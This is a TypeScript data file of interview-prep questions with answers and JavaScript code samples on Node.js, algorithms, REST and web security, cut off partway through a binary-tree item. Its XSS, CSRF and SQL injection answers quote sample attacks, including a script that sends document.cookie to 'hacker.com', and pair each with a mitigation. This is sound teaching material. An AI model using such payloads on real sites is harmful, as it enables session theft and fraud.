import { InterviewQuestion } from "../../types";

export function getDayQuestionsP2(dayNum: number): InterviewQuestion[] {
  switch (dayNum) {
    case 11:
      return [
        {
          id: "lf-p11-1",
          q: "What is an event emitter in Node.js?",
          hint: "Core module for handling custom events.",
          answer: "EventEmitter is a class that facilitates communication between objects in Node.js. It allows objects to emit named events that cause registered listener functions to be called.",
          code: `const EventEmitter = require('events');
const myEmitter = new EventEmitter();

// Register a listener for the 'userJoined' event
myEmitter.on('userJoined', (name) => {
  console.log(\`Welcome, \${name}!\`);
});

// Trigger the event
myEmitter.emit('userJoined', 'Alice');`,
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-2",
          q: "Explain streams in Node.js.",
          hint: "Handling data piece by piece.",
          answer: "Streams are collections of data that might not be available all at once and don't have to fit in memory. They are used to read/write large files or handle network communications efficiently.",
          code: `const fs = require('fs');

// Read large files piece by piece instead of all at once
const readStream = fs.createReadStream('large-file.txt', 'utf8');

// 'data' fires for each chunk received
readStream.on('data', (chunk) => {
  console.log(\`Received \${chunk.length} characters.\`);
});

// 'end' fires when all chunks are read
readStream.on('end', () => {
  console.log('Finished reading file.');
});`,
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-3",
          q: "What is middleware in Express?",
          hint: "Functions that have access to req, res, and next.",
          answer: "Middleware functions execute during the lifecycle of a request to the Express server. They have access to the request object, response object, and the next middleware function. They can modify req/res, end the cycle, or call next().",
          code: `const express = require('express');
const app = express();

// Middleware: runs for every request
const logger = (req, res, next) => {
  console.log(\`\${req.method} \${req.url}\`);
  next(); // Must call next() to continue
};

app.use(logger); // Register globally

app.get('/', (req, res) => res.send('Hello'));`,
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-4",
          q: "Reverse an integer: Strategy?",
          hint: "Handle negative numbers and overflow.",
          answer: "Extract the sign, convert to string, reverse, convert back to integer, reapply sign. Check for 32-bit integer overflow.",
          code: `function reverse(x) {
  const sign = x < 0 ? -1 : 1;
  // Reverse the digits of the absolute value
  const reversed = parseInt(
    Math.abs(x).toString().split('').reverse().join('')
  ) * sign;
  // Check for 32-bit integer overflow
  if (reversed < Math.pow(-2, 31) ||
      reversed > Math.pow(2, 31) - 1) return 0;
  return reversed;
}
console.log(reverse(123));  // 321
console.log(reverse(-123)); // -321`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-5",
          q: "Palindrome Number: Strategy without string conversion?",
          hint: "Reverse half the number mathematically.",
          answer: "If negative, false. If ends in 0 (and isn't 0), false. Repeatedly extract the last digit (x % 10) and build a reversed number (reversed * 10 + digit). Stop when reversed >= x.",
          code: `function isPalindrome(x) {
  // Negatives and numbers ending in 0 can't be palindromes
  if (x < 0 || (x % 10 === 0 && x !== 0)) return false;
  let reversedHalf = 0;
  // Build reversed half digit by digit
  while (x > reversedHalf) {
    reversedHalf = reversedHalf * 10 + x % 10;
    x = Math.floor(x / 10);
  }
  // Handle even or odd number of digits
  return x === reversedHalf || x === Math.floor(reversedHalf / 10);
}
console.log(isPalindrome(121)); // true`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-6",
          q: "What is `package-lock.json`?",
          hint: "Locks dependency tree versions.",
          answer: "It describes the exact dependency tree that was installed, ensuring identical installations across different environments and team members.",
          code: `// package.json says: "express": "^4.17.1"
// This allows installing 4.18.0 if available.

// package-lock.json pins the EXACT tree:
// { "express": "4.17.3", ... subdependencies }

// 'npm ci' uses lock file strictly (no upgrades)`,
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-7",
          q: "Difference between `require()` and `import`?",
          hint: "CommonJS vs ES Modules.",
          answer: "`require()` is CommonJS, synchronous, and evaluates dynamically. `import` is ES Modules (ESM), asynchronous, evaluates statically, and supports tree-shaking.",
          code: `// CommonJS (old Node.js standard)
const fs = require('fs');       // synchronous
module.exports = function() {};

// ES Modules (modern standard)
import fs from 'fs';            // static, async
export function doSomething() {}
// Requires "type": "module" in package.json`,
          category: "Node.js Theory",
          language: "javascript"
        },
        {
          id: "lf-p11-8",
          q: "Merge Intervals: Strategy?",
          hint: "Sort by start time, then merge overlapping.",
          answer: "First, sort intervals by start time. Iterate: if current start <= previous end, merge by updating previous end to `Math.max(prevEnd, currEnd)`. Else, add current to results.",
          code: `function merge(intervals) {
  if (!intervals.length) return [];
  // Sort by start time to find overlaps
  intervals.sort((a, b) => a[0] - b[0]);
  const res = [intervals[0]];
  for (let i = 1; i < intervals.length; i++) {
    const last = res[res.length - 1];
    // If current starts before last ends, merge
    if (intervals[i][0] <= last[1]) {
      last[1] = Math.max(last[1], intervals[i][1]);
    } else {
      res.push(intervals[i]);
    }
  }
  return res;
}
console.log(merge([[1,3],[2,6],[8,10],[15,18]]));`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-9",
          q: "Insert Interval: Strategy?",
          hint: "Add before, merge overlapping, add after.",
          answer: "Three phases: 1) add all intervals ending before newInterval starts. 2) merge all intervals overlapping with newInterval. 3) add remaining intervals.",
          code: `function insert(intervals, newInterval) {
  const res = [];
  let i = 0, n = intervals.length;
  // Phase 1: add all intervals ending before newInterval starts
  while (i < n && intervals[i][1] < newInterval[0]) res.push(intervals[i++]);
  // Phase 2: merge all overlapping intervals
  while (i < n && intervals[i][0] <= newInterval[1]) {
    newInterval[0] = Math.min(newInterval[0], intervals[i][0]);
    newInterval[1] = Math.max(newInterval[1], intervals[i][1]);
    i++;
  }
  res.push(newInterval);
  // Phase 3: add remaining intervals
  while (i < n) res.push(intervals[i++]);
  return res;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p11-10",
          q: "What does `process.nextTick()` do?",
          hint: "Schedules callback before next Event Loop phase.",
          answer: "It defers the execution of an action until the current operation completes, but BEFORE the Event Loop continues to the next phase (even before Promises/microtasks in older Node versions).",
          code: `console.log('1');

// nextTick: runs before Promise microtasks
process.nextTick(() => {
  console.log('3 - nextTick');
});

// Promise: microtask queue
Promise.resolve().then(() => {
  console.log('4 - promise');
});

console.log('2');
// Output: 1, 2, 3, 4`,
          category: "Node.js Theory",
          language: "javascript"
        }
      ];
    case 12:
      return [
        {
          id: "lf-p12-1",
          q: "What is CORS?",
          hint: "Cross-Origin Resource Sharing.",
          answer: "CORS is a security mechanism enforced by browsers that restricts web pages from making requests to a different domain than the one that served the web page, unless the server explicitly allows it.",
          code: `// In Express, enabling CORS:
const cors = require('cors');
const express = require('express');
const app = express();

// Allow all origins (basic usage)
app.use(cors());

// Or configure specific allowed origins:
// app.use(cors({ origin: 'http://my-frontend.com' }));`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-2",
          q: "What is JWT (JSON Web Token)?",
          hint: "Stateless authentication token.",
          answer: "A standard for securely transmitting information as a JSON object. Used for stateless authentication. It consists of three parts: Header, Payload, and Signature.",
          code: `// Example: Creating a JWT (jsonwebtoken library)
const jwt = require('jsonwebtoken');

const payload = { userId: 123, role: 'admin' };
const secretKey = 'my_super_secret';

// Sign token with payload, secret, and options
const token = jwt.sign(payload, secretKey, { expiresIn: '1h' });
console.log(token); // eyJhbGci... (Header.Payload.Signature)`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-3",
          q: "Where should you store a JWT on the client?",
          hint: "HttpOnly cookies vs LocalStorage.",
          answer: "HttpOnly cookies are safest against XSS because JS can't read them. LocalStorage is vulnerable to XSS. If using LocalStorage, you must heavily sanitize all inputs.",
          code: `// Setting an HttpOnly cookie in Express
res.cookie('token', jwtToken, {
  httpOnly: true, // Prevents JS access (mitigates XSS)
  secure: process.env.NODE_ENV === 'production', // HTTPS only
  sameSite: 'strict', // Mitigates CSRF
  maxAge: 3600000 // 1 hour
});`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-4",
          q: "Symmetric vs Asymmetric Encryption?",
          hint: "One key vs Two keys.",
          answer: "Symmetric uses the SAME key to encrypt and decrypt (fast, e.g., AES). Asymmetric uses a Public key to encrypt and a Private key to decrypt (secure for key exchange, e.g., RSA).",
          code: `// Conceptual Example:

// Symmetric (AES) - Same key for both operations
// const encrypted = encrypt('data', 'sharedSecret');
// const decrypted = decrypt(encrypted, 'sharedSecret');

// Asymmetric (RSA) - Different keys
// const encrypted = encrypt('data', publicKey);
// const decrypted = decrypt(encrypted, privateKey);`,
          category: "Computer Science",
          language: "javascript"
        },
        {
          id: "lf-p12-5",
          q: "What is hashing and how does it differ from encryption?",
          hint: "One-way vs Two-way.",
          answer: "Hashing is a one-way mathematical function (e.g., bcrypt, SHA-256) used for verifying data integrity (passwords). Encryption is two-way and reversible if you have the key.",
          code: `const bcrypt = require('bcrypt');

async function hashPassword(plainText) {
  const saltRounds = 10; // Controls hashing cost
  // Hashing is one-way
  return await bcrypt.hash(plainText, saltRounds);
}

async function checkPassword(plainText, hash) {
  // Compare plain text with hash safely
  return await bcrypt.compare(plainText, hash);
}`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-6",
          q: "Find Minimum in Rotated Sorted Array: Strategy?",
          hint: "Binary Search comparing mid to right.",
          answer: "Use Binary Search. Compare `mid` element with `right` element. If `mid > right`, the minimum is in the right half. Else, the minimum is in the left half (including mid).",
          code: `function findMin(nums) {
  let left = 0, right = nums.length - 1;
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    // Compare mid with right
    if (nums[mid] > nums[right]) {
      left = mid + 1; // Min is in the right half
    } else {
      right = mid;    // Min is mid or in the left half
    }
  }
  return nums[left];
}
console.log(findMin([3,4,5,1,2])); // 1`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p12-7",
          q: "Search in Rotated Sorted Array: Strategy?",
          hint: "Find sorted half, check if target is inside.",
          answer: "Binary Search. Determine which half is normally sorted. If target falls within the sorted half's range, search there. Otherwise, search the other half.",
          code: `function search(nums, target) {
  let left = 0, right = nums.length - 1;
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    if (nums[mid] === target) return mid;
    
    // Check if left half is normally sorted
    if (nums[left] <= nums[mid]) {
      if (target >= nums[left] && target < nums[mid]) right = mid - 1;
      else left = mid + 1;
    } 
    // Otherwise, right half must be sorted
    else {
      if (target > nums[mid] && target <= nums[right]) left = mid + 1;
      else right = mid - 1;
    }
  }
  return -1;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p12-8",
          q: "What is XSS (Cross-Site Scripting)?",
          hint: "Injecting malicious scripts into web pages.",
          answer: "A vulnerability where an attacker injects malicious client-side scripts into a trusted site. Prevented by sanitizing input and escaping output (e.g., using `textContent` instead of `innerHTML`).",
          code: `// XSS Attack Example:
// User input: "<script>fetch('http://hacker.com/?c=' + document.cookie)</script>"

// Bad (Vulnerable): Executes injected script
// document.getElementById('comment').innerHTML = userInput;

// Good (Safe): Treats input as plain text
// document.getElementById('comment').textContent = userInput;`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-9",
          q: "What is CSRF (Cross-Site Request Forgery)?",
          hint: "Tricking user's browser into making unwanted requests.",
          answer: "An attack that forces an authenticated user to execute unwanted actions on a web application. Prevented by using anti-CSRF tokens or `SameSite` cookie attributes.",
          code: `// CSRF Attack Example:
// Hacker embeds this in their site:
// <img src="http://bank.com/transfer?to=hacker&amount=1000" />
// Your browser auto-sends your cookies to bank.com!

// Mitigation strategies:
// 1. SameSite cookie attribute (Strict or Lax)
// 2. Anti-CSRF tokens in forms or headers.`,
          category: "Web Security",
          language: "javascript"
        },
        {
          id: "lf-p12-10",
          q: "What is SQL Injection?",
          hint: "Manipulating queries via unsanitized input.",
          answer: "An attacker inserts malicious SQL statements into entry fields for execution. Prevented by using parameterized queries (Prepared Statements) or ORMs.",
          code: `// DANGEROUS: Vulnerable to SQL injection
// const id = "1 OR 1=1";
// db.query(\`SELECT * FROM users WHERE id = \${id}\`);

// SAFE: Parameterized Query / Prepared Statements
// const id = 1;
// db.query('SELECT * FROM users WHERE id = $1', [id]);`,
          category: "Web Security",
          language: "javascript"
        }
      ];
    case 13:
      return [
        {
          id: "lf-p13-1",
          q: "Climbing Stairs: Strategy?",
          hint: "Fibonacci sequence.",
          answer: "Dynamic Programming. To reach step n, you must step from n-1 or n-2. Thus, `ways(n) = ways(n-1) + ways(n-2)`. Optimize space by only keeping the last two values.",
          code: `function climbStairs(n) {
  if (n <= 2) return n;
  let a = 1, b = 2; // Base cases: 1 way for 1 step, 2 ways for 2 steps
  for (let i = 3; i <= n; i++) {
    const next = a + b; // Current step = sum of previous two
    a = b;
    b = next;
  }
  return b;
}
console.log(climbStairs(5)); // 8`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-2",
          q: "House Robber: Strategy?",
          hint: "Max of (rob current + rob n-2) or (rob n-1).",
          answer: "You can't rob adjacent houses. For each house, decide: rob it and add to loot from two houses back, OR skip it and keep loot from previous house.",
          code: `function rob(nums) {
  let prev1 = 0; // Max money from n-1 houses
  let prev2 = 0; // Max money from n-2 houses
  for (const num of nums) {
    const temp = prev1;
    // Choose: rob current + prev2 OR skip current and keep prev1
    prev1 = Math.max(prev2 + num, prev1);
    prev2 = temp;
  }
  return prev1;
}
console.log(rob([2,7,9,3,1])); // 12 (2+9+1)`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-3",
          q: "What is Dynamic Programming (DP)?",
          hint: "Overlapping subproblems + Optimal substructure.",
          answer: "An optimization technique that solves complex problems by breaking them down into simpler subproblems, solving each once, and storing their solutions (memoization or tabulation).",
          code: `// Top-down Memoization (recursive)
function fibMemo(n, memo = {}) {
  if (n in memo) return memo[n];
  if (n <= 1) return n;
  memo[n] = fibMemo(n - 1, memo) + fibMemo(n - 2, memo);
  return memo[n];
}

// Bottom-up Tabulation (iterative)
function fibTab(n) {
  const dp = [0, 1];
  for (let i = 2; i <= n; i++) dp[i] = dp[i-1] + dp[i-2];
  return dp[n];
}`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-4",
          q: "Memoization vs Tabulation?",
          hint: "Top-down vs Bottom-up.",
          answer: "Memoization is Top-Down: start at the goal and recursively solve subproblems, caching results. Tabulation is Bottom-Up: start at the base cases and iteratively build up to the goal.",
          code: `// Memoization (Top-down, recursive)
// Pros: only calculates subproblems that are actually needed
// Cons: recursion overhead, risk of call stack overflow

// Tabulation (Bottom-up, iterative)
// Pros: fast execution, no recursion depth limit issues
// Cons: computes all subproblems up to n, even unneeded ones`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-5",
          q: "Coin Change: DP Strategy?",
          hint: "dp array of minimum coins needed.",
          answer: "Create a `dp` array of size `amount + 1` initialized to `Infinity`, with `dp[0] = 0`. For each coin and each amount, `dp[i] = Math.min(dp[i], dp[i - coin] + 1)`.",
          code: `function coinChange(coins, amount) {
  // dp[i] will store min coins needed for amount i
  const dp = new Array(amount + 1).fill(Infinity);
  dp[0] = 0; // 0 coins needed for amount 0
  
  for (let i = 1; i <= amount; i++) {
    for (const coin of coins) {
      if (i - coin >= 0) {
        dp[i] = Math.min(dp[i], dp[i - coin] + 1);
      }
    }
  }
  return dp[amount] === Infinity ? -1 : dp[amount];
}
console.log(coinChange([1,2,5], 11)); // 3 (5+5+1)`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-6",
          q: "Longest Increasing Subsequence: DP Strategy?",
          hint: "dp array tracking max length ending at i.",
          answer: "Create `dp` array of size `n` initialized to 1. For each `i`, look back at all `j < i`. If `nums[i] > nums[j]`, `dp[i] = Math.max(dp[i], dp[j] + 1)`. Return max of `dp`.",
          code: `function lengthOfLIS(nums) {
  if (!nums.length) return 0;
  // dp[i] stores the max LIS length ending at index i
  const dp = new Array(nums.length).fill(1);
  let maxLIS = 1;
  for (let i = 1; i < nums.length; i++) {
    for (let j = 0; j < i; j++) {
      // If valid increasing step, update max length
      if (nums[i] > nums[j]) {
        dp[i] = Math.max(dp[i], dp[j] + 1);
      }
    }
    maxLIS = Math.max(maxLIS, dp[i]);
  }
  return maxLIS;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p13-7",
          q: "Difference between `map` and `forEach`?",
          hint: "Returns new array vs returns undefined.",
          answer: "`map()` returns a NEW array with transformed elements. `forEach()` returns `undefined` and is used to perform side effects (like mutating an external variable or logging).",
          code: `const nums = [1, 2, 3];

// map(): returns a NEW array with transformed values
const doubled = nums.map(x => x * 2); 
console.log(doubled); // [2, 4, 6]

// forEach(): returns undefined, used for side effects
let sum = 0;
nums.forEach(x => sum += x);
console.log(sum); // 6`,
          category: "JS Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-8",
          q: "What is an ORM (Object-Relational Mapping)?",
          hint: "Code mapping to database tables.",
          answer: "A technique/tool that lets you query and manipulate data from a database using an object-oriented paradigm. Examples: TypeORM, Prisma, Mongoose (ODM for NoSQL).",
          code: `// Raw SQL (without ORM):
// db.query("SELECT * FROM users WHERE age > 18");

// Prisma ORM Example:
// Code maps directly to JS/TS objects
// const adults = await prisma.user.findMany({
//   where: { age: { gt: 18 } }
// });`,
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-9",
          q: "What is a REST API?",
          hint: "Representational State Transfer.",
          answer: "An architectural style for APIs that uses standard HTTP methods (GET, POST, PUT, DELETE), stateless communication, and structured URIs to manipulate resources (like JSON).",
          code: `// RESTful API standard conventions:
// GET    /users      -> Retrieve all users
// POST   /users      -> Create a new user
// GET    /users/123  -> Retrieve user with ID 123
// PUT    /users/123  -> Completely replace user 123
// PATCH  /users/123  -> Partially update user 123
// DELETE /users/123  -> Delete user 123`,
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p13-10",
          q: "Difference between PUT and PATCH in REST?",
          hint: "Full vs Partial update.",
          answer: "PUT replaces the entire resource; if a field is omitted, it should be set to null. PATCH applies partial modifications to the resource; omitted fields are left unchanged.",
          code: `// Existing resource: { name: 'Alice', age: 25, city: 'NY' }

// PATCH { age: 26 }
// Result: { name: 'Alice', age: 26, city: 'NY' } 
// (Only updates the provided fields)

// PUT { name: 'Alice', age: 26 }
// Result: { name: 'Alice', age: 26, city: null } 
// (Replaces entire resource, omits unspecified fields)`,
          category: "Backend Theory",
          language: "javascript"
        }
      ];
    case 14:
      return [
        {
          id: "lf-p14-1",
          q: "Reverse a Linked List: Recursive Strategy?",
          hint: "Reverse rest, point next to self.",
          answer: "Base case: if head is null or head.next is null, return head. Recursively call on head.next. Then `head.next.next = head` and `head.next = null`.",
          code: `function reverseList(head) {
  // Base case: empty list or single node
  if (head === null || head.next === null) return head;
  
  // Recursively reverse the rest of the list
  const reversedHead = reverseList(head.next);
  
  // Make the next node point back to the current node
  head.next.next = head;
  // Sever the forward link
  head.next = null;
  
  return reversedHead; // Always the original tail node
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-2",
          q: "Detect Cycle in Linked List (Floyd's Algorithm)?",
          hint: "Tortoise and Hare.",
          answer: "Use a slow pointer (1 step) and a fast pointer (2 steps). If they ever meet, there is a cycle. If fast reaches null, there is no cycle.",
          code: `function hasCycle(head) {
  let slow = head; // Moves 1 step
  let fast = head; // Moves 2 steps
  
  while (fast !== null && fast.next !== null) {
    slow = slow.next;
    fast = fast.next.next;
    
    // If they meet, the fast pointer looped around (Cycle found)
    if (slow === fast) return true;
  }
  // Fast reached the end of the list (No cycle)
  return false;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-3",
          q: "Merge Two Sorted Linked Lists?",
          hint: "Dummy node + iterate.",
          answer: "Create a dummy head. Use a pointer. Compare nodes from both lists, attach the smaller to the pointer, advance the list and pointer. Attach any remaining nodes at the end.",
          code: `function mergeTwoLists(l1, l2) {
  const dummy = { val: -1, next: null }; // Dummy starting node
  let curr = dummy;
  
  while (l1 !== null && l2 !== null) {
    if (l1.val <= l2.val) {
      curr.next = l1;
      l1 = l1.next;
    } else {
      curr.next = l2;
      l2 = l2.next;
    }
    curr = curr.next;
  }
  // Attach any remaining elements from either list
  curr.next = l1 !== null ? l1 : l2;
  return dummy.next; // Return the head of the merged list
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-4",
          q: "Remove Nth Node From End of List?",
          hint: "Fast pointer ahead by N steps.",
          answer: "Use two pointers, dummy node. Move fast pointer N steps ahead. Then move both fast and slow until fast reaches the end. Slow will be just before the target node.",
          code: `function removeNthFromEnd(head, n) {
  // Dummy node handles edge cases (e.g. removing the head)
  const dummy = { val: 0, next: head };
  let slow = dummy, fast = dummy;
  
  // Move fast pointer n steps ahead
  for (let i = 0; i <= n; i++) {
    fast = fast.next;
  }
  
  // Move both until fast reaches the end
  // Slow will end up exactly before the target node
  while (fast !== null) {
    slow = slow.next;
    fast = fast.next;
  }
  
  // Skip the nth node
  slow.next = slow.next.next;
  return dummy.next;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-5",
          q: "Find Middle of Linked List?",
          hint: "Fast pointer (2x) and Slow pointer (1x).",
          answer: "Use Tortoise and Hare approach. Slow moves 1 step, fast moves 2 steps. When fast reaches the end, slow is at the middle.",
          code: `function middleNode(head) {
  let slow = head, fast = head;
  // Fast moves 2x speed. When fast reaches end, slow is at middle.
  while (fast !== null && fast.next !== null) {
    slow = slow.next;       // 1 step
    fast = fast.next.next;  // 2 steps
  }
  return slow; // The middle node
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p14-6",
          q: "What is HTTP status code 401 vs 403?",
          hint: "Authentication vs Authorization.",
          answer: "401 Unauthorized means 'You must log in'. 403 Forbidden means 'You are logged in, but you don't have permission to do this.'",
          code: `// Common HTTP Status Codes to memorize:
// 200 OK           - Success
// 201 Created      - Resource created successfully (usually POST)
// 400 Bad Request  - Client sent invalid data
// 401 Unauthorized - Client must authenticate (login) first
// 403 Forbidden    - Authenticated, but lacks permissions for this
// 404 Not Found    - Resource doesn't exist
// 500 Server Error - The server crashed or encountered an issue`,
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p14-7",
          q: "What is GraphQl?",
          hint: "Query language for APIs.",
          answer: "A query language for APIs that allows clients to request exactly the data they need, no more, no less, from a single endpoint, solving the over-fetching/under-fetching problem of REST.",
          code: `// GraphQL Query Example:
// query {
//   user(id: "123") {
//     name
//     posts { title }
//   }
// }

// Response ONLY contains exactly what was asked for:
// { "data": { "user": { "name": "Alice", "posts": [...] } } }
// Fixes REST's over-fetching (getting too much data) problem.`,
          category: "Backend Theory",
          language: "javascript"
        },
        {
          id: "lf-p14-8",
          q: "Microservices vs Monolith?",
          hint: "One codebase vs distributed services.",
          answer: "Monolith builds all features in one codebase and deployment. Microservices break features into independent, deployable services communicating via network (more complex, but scales better).",
          code: `// Monolith:
// [ User Module | Payment Module | Email Module ] -> One App -> One DB
// Simple to deploy initially, but hard to scale specific parts.

// Microservices:
// [ User Service ]    -> User DB
// [ Payment Service ] -> Payment DB
// [ Email Service ]
// Services communicate via REST, gRPC, or message queues.
// Complex to manage, but highly scalable and fault-tolerant.`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p14-9",
          q: "What is a Message Queue?",
          hint: "Async communication between services.",
          answer: "A component used for asynchronous communication between microservices. It decoupling systems, allowing one to send a message without waiting for the receiver to process it immediately (e.g., RabbitMQ, Kafka).",
          code: `// Example Use Case for Message Queues (RabbitMQ, Kafka, AWS SQS):
// 1. User uploads a large video to Service A.
// 2. Service A places a message "process_video_123" on the Queue.
// 3. Service A immediately replies "Upload successful" to the User.
// 4. Service B (Video Processor) pulls the message from the Queue 
//    and processes it in the background independently.`,
          category: "System Design",
          language: "javascript"
        },
        {
          id: "lf-p14-10",
          q: "Stateful vs Stateless applications?",
          hint: "Session memory.",
          answer: "Stateful remembers client data (session) across requests (hard to scale). Stateless treats each request independently, relying on tokens/DB for context (easy to scale horizontally).",
          code: `// Stateful (Session in memory):
// app.post('/login', (req) => { session[user_id] = true; });
// app.get('/data', (req) => { if (session[user_id]) return data; });
// Flaw: If load balancer sends next request to a different server, 
//       that server doesn't have the session memory!

// Stateless (JWT):
// Server stores no session memory. Client sends JWT with every request.
// ANY server can validate the JWT payload mathematically.
// Easy to scale horizontally across many servers.`,
          category: "System Design",
          language: "javascript"
        }
      ];
    case 15:
      return [
        {
          id: "lf-p15-1",
          q: "Invert Binary Tree: Strategy?",
          hint: "Swap children, recurse.",
          answer: "Recursively swap the left and right pointers of every node in the tree.",
          code: `function invertTree(root) {
  if (root === null) return null; // Base case: empty node
  
  // Swap the left and right children
  const temp = root.left;
  root.left = root.right;
  root.right = temp;
  
  // Recursively invert the subtrees
  invertTree(root.left);
  invertTree(root.right);
  
  return root; // Return the inverted tree root
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-2",
          q: "Maximum Depth of Binary Tree?",
          hint: "1 + max of left and right depths.",
          answer: "Base case: if null return 0. Else, compute max depth of left subtree and right subtree. Return the greater of the two plus 1.",
          code: `function maxDepth(root) {
  if (root === null) return 0; // Empty tree has depth 0
  
  // Get max depths of left and right subtrees
  const leftDepth = maxDepth(root.left);
  const rightDepth = maxDepth(root.right);
  
  // Add 1 for the current node's depth
  return Math.max(leftDepth, rightDepth) + 1;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-3",
          q: "Same Tree: Strategy?",
          hint: "Recursively check values and structure.",
          answer: "If both null, true. If one null, false. If values differ, false. Else, return `isSameTree(p.left, q.left) && isSameTree(p.right, q.right)`.",
          code: `function isSameTree(p, q) {
  // If both are null, trees match
  if (p === null && q === null) return true;
  // If only one is null, they don't match
  if (p === null || q === null) return false;
  // If values differ, they don't match
  if (p.val !== q.val) return false;
  
  // Recursively check left and right subtrees
  return isSameTree(p.left, q.left) && isSameTree(p.right, q.right);
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-4",
          q: "Subtree of Another Tree: Strategy?",
          hint: "Check same tree at every node.",
          answer: "If subtree is null, true. If main tree is null, false. Check if `isSameTree(root, subRoot)`. If not, recurse on `root.left` OR `root.right`.",
          code: `function isSubtree(root, subRoot) {
  if (!subRoot) return true;  // Empty subRoot is always a subtree
  if (!root) return false;    // Reached end of main tree
  
  // Check if identical starting from current node
  if (isSameTree(root, subRoot)) return true;
  
  // Recurse down both left and right branches
  return isSubtree(root.left, subRoot) || isSubtree(root.right, subRoot);
}

function isSameTree(p, q) {
  if (!p && !q) return true;
  if (!p || !q || p.val !== q.val) return false;
  return isSameTree(p.left, q.left) && isSameTree(p.right, q.right);
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-5",
          q: "Lowest Common Ancestor of a BST?",
          hint: "Use BST property (values left/right).",
          answer: "If both p and q are smaller than root, LCA is in left subtree. If both are larger, LCA is in right subtree. If they split (one left, one right, or one equals root), root is the LCA.",
          code: `function lowestCommonAncestor(root, p, q) {
  let curr = root;
  while (curr !== null) {
    // Both nodes are smaller -> go left
    if (p.val < curr.val && q.val < curr.val) {
      curr = curr.left;
    } 
    // Both nodes are larger -> go right
    else if (p.val > curr.val && q.val > curr.val) {
      curr = curr.right;
    } 
    // Split point found! This is the LCA.
    else {
      return curr; 
    }
  }
  return null;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-6",
          q: "What is a Binary Search Tree (BST)?",
          hint: "Left < Parent < Right.",
          answer: "A binary tree where for every node: all elements in the left subtree are smaller, and all elements in the right subtree are larger.",
          code: `// BST Node definition: Left child is smaller, Right child is larger
function TreeNode(val, left = null, right = null) {
  this.val = val;
  this.left = left;
  this.right = right;
}

// Search in BST operates in O(log n) average time
function searchBST(root, val) {
  if (!root || root.val === val) return root; // Found or reached end
  
  // Leverage BST properties to search only half the tree
  if (val < root.val) return searchBST(root.left, val);
  return searchBST(root.right, val);
}`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p15-7",
          q: "Difference between BFS and DFS in a Tree?",
          hint: "Level by level vs Deep as possible.",
          answer: "Breadth-First Search (BFS) explores level by level using a Queue. Depth-First Search (DFS) goes as deep as possible before backtracking, using a Stack or Recursion.",
          code: `// BFS uses a Queue (First In, First Out)
// Explores level by level (horizontal)
function bfs(root) {
  if (!root) return;
  const queue = [root];
  while (queue.length > 0) {
    const node = queue.shift(); // Dequeue
    console.log(node.val);
    
    // Enqueue children
    if (node.left) queue.push(node.left);
    if (node.right) queue.push(node.right);
  }
}`,
          category: "Theory",
          language: "javascript"
        },
        {
          id: "lf-p15-8",
          q: "Binary Tree Level Order Traversal (BFS)?",
          hint: "Queue with level size tracking.",
          answer: "Use a queue. For each level, determine queue size, shift that many elements out, push their values to a level array, and push their children to the queue.",
          code: `function levelOrder(root) {
  if (!root) return [];
  const res = [], queue = [root];
  
  while (queue.length > 0) {
    // Determine how many nodes are on this level
    const levelSize = queue.length;
    const currentLevel = [];
    
    // Process exactly the nodes of the current level
    for (let i = 0; i < levelSize; i++) {
      const node = queue.shift();
      currentLevel.push(node.val);
      if (node.left) queue.push(node.left);
      if (node.right) queue.push(node.right);
    }
    res.push(currentLevel);
  }
  return res;
}`,
          category: "DSA",
          language: "javascript"
        },
        {
          id: "lf-p15-9",
          q: "Validate Binary Search Tree?",
          hint: "Pass down min and max boundaries.",
          answer: "Use a helper function that takes the node, a min value, and a max value. Root starts at (-Infinity, Infinity). Left child updates max to parent val. Right child updates min to parent val.",
          code: `function isValidBST(root, min = -Infinity, max = Infinity) {
  if (root === null) return true;
  
  // Current node must fit within its allowed min/max bounds
  if (root.val <= min || root.val >= max) return false;
  
  // Left subtree must be smaller than current val (max boundary)
  // Right subtree must be larger than current val (min boundary)
